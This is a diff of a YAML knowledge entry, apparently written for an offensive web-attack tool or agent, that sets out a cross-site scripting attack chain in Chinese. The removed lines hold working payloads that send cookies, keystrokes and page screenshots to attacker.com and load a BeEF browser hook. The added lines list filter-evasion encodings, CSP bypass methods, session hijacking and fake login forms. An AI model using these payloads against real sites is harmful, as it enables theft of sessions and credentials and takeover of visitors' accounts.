@@ -1,23 +1,77 @@
-name: 跨站脚本攻击
-description: 反射型、存储型、DOM型XSS攻击技术
+name: XSS攻击链
+description: XSS攻击思维链 - 反射/存储/DOM型、WAF绕过、利用技巧
 domain: web
-version: '1.0'
+version: '3.0'
 tags:
 - web
 - xss
-- javascript
-knowledge: "# XSS攻击链\n\n## 反射型XSS攻击链\n\n### 基础利用\n\n```\n1. 探测XSS\n   <script>alert(1)</script>\n\n2. 绕过过滤\n   <img src=x\
-  \ onerror=alert(1)>\n   <svg onload=alert(1)>\n\n3. 获取Cookie\n   <script>new Image().src=\"http://attacker.com/steal?c=\"\
-  +document.cookie;</script>\n\n4. 窃取数据\n   http://attacker.com/steal?c=PHPSESSID=xxx\n```\n\n---\n\n## 存储型XSS攻击链\n\n### 长期钓鱼\n\
-  \n```\n1. 寻找存储点\n   - 评论区\n   - 用户资料\n   - 帖子内容\n\n2. 植入Payload\n   <script>fetch('http://attacker.com/log?c='+document.cookie)</script>\n\
-  \n3. 等待管理员访问\n   - 管理后台\n   - 审核页面\n\n4. 账户接管\n   - 使用窃取的Cookie登录\n```\n\n---\n\n## DOM型XSS攻击链\n\n### 前端利用\n\n```\n1. 探测DOM\
-  \ sinks\n   - document.location\n   - document.URL\n   - eval()\n   - innerHTML\n\n2. 构造Payload\n   <img src=x onerror=location.href='http://attacker.com?c='+document.cookie>\n\
-  \n3. 利用\n   - 重定向\n   - 窃取数据\n```\n\n---\n\n## 完整攻击链示例\n\n### 1. 基础Cookie窃取\n\n```html\n<script>\nnew Image().src=\"http://attacker.com/steal?c=\"\
-  +document.cookie;\n</script>\n```\n\n### 2. 键盘记录\n\n```html\n<script>\ndocument.onkeypress=function(e){\n  new Image().src=\"\
-  http://attacker.com/log?k=\"+e.key;\n}\n</script>\n```\n\n### 3. 屏幕截图\n\n```html\n<script>\nhtml2canvas(document.body).then(canvas\
-  \ => {\n  fetch('http://attacker.com/upload', {\n    method: 'POST',\n    body: canvas.toDataURL()\n  });\n});\n</script>\n\
-  ```\n\n### 4. BeEF钩子\n\n```html\n<script src=\"http://attacker.com:3000/hook.js\"></script>\n```\n\n### 5. 绕过CSP + 持久化\n\
-  \n```html\n<script>\nif(window.name !== 'xss'){\n  window.name = 'xss';\n  fetch('http://attacker.com/persist?d='+document.cookie);\n\
-  }\n</script>\n```\n\n---\n\n## 攻击链速查\n\n| 目标 | Payload | 说明 |\n|------|---------|------|\n| 弹窗测试 | `<script>alert(1)</script>`\
-  \ | 基础测试 |\n| Cookie窃取 | `new Image().src=\"http://attacker?c=\"+document.cookie` | 会话劫持 |\n| 键盘记录 | `document.onkeypress=function(e){...}`\
-  \ | 输入窃取 |\n| 重定向 | `location.href='http://attacker'` | 钓鱼 |\n| 持久化 | 存储型XSS | 长期控制 |\n"
+
+knowledge: |
+  # XSS攻击思维链
+
+  ```
+  类型判断 → 反射型(URL参数)/存储型(表单存储)/DOM型(前端渲染)
+        ↓
+  绕过过滤 → 标签/事件/编码/协议
+        ↓
+  利用执行 → Cookie窃取/钓鱼/键盘记录/BeEF
+  ```
+
+  ---
+
+  ## 类型判断
+
+  | 类型 | 特征 | 触发点 |
+  |------|------|--------|
+  | 反射型 | URL参数直接输出 | 搜索页/错误页 |
+  | 存储型 | 数据存数据库后输出 | 评论/用户资料/帖子 |
+  | DOM型 | 前端JS动态渲染 | location.hash/innerHTML |
+
+  ---
+
+  ## 绕过技巧
+
+  **标签替代**:
+  - `<script>` → `<img/svg/iframe/video/audio/details>`
+  - `<on事件>` → `onerror/onload/onfocus/onmouseover`
+
+  **编码绕过**:
+  - HTML实体: `&#x3c;script&#x3e;`
+  - Unicode: `\u003cscript\u003e`
+  - URL编码: `%3Cscript%3E`
+  - Base64: `<a href="data:text/html;base64,...">`
+
+  **特殊构造**:
+  - 大小写混合: `<ScRiPt>`
+  - 插入符号: `<scr<script>ipt>`
+  - 利用事件: `<img src=x onerror=alert(1)>`
+  - 利用伪协议: `<a href="javascript:alert(1)">`
+
+  ---
+
+  ## CSP绕过
+
+  | CSP策略 | 绕过方法 |
+  |---------|----------|
+  | script-src self | JSONP回调/重定向 |
+  | default-src self | iframe srcdoc |
+  | 无unsafe-inline | DOM XSS/事件处理器 |
+  | 无unsafe-eval | DOM clobbering |
+
+  ---
+
+  ## 利用方式
+
+  **Cookie窃取**: document.cookie发送到攻击者
+  **会话劫持**: 获取session后直接登录
+  **键盘记录**: 监听onkeypress事件
+  **钓鱼**: 伪造登录框
+  **BeEF**: 加载钩子脚本控制浏览器
+
+  ---
+
+  ## XSS工具
+
+  - **XSStrike**: 自动化扫描
+  - **BeEF**: 浏览器控制框架
+  - **XSStriker**: WAF绕过测试
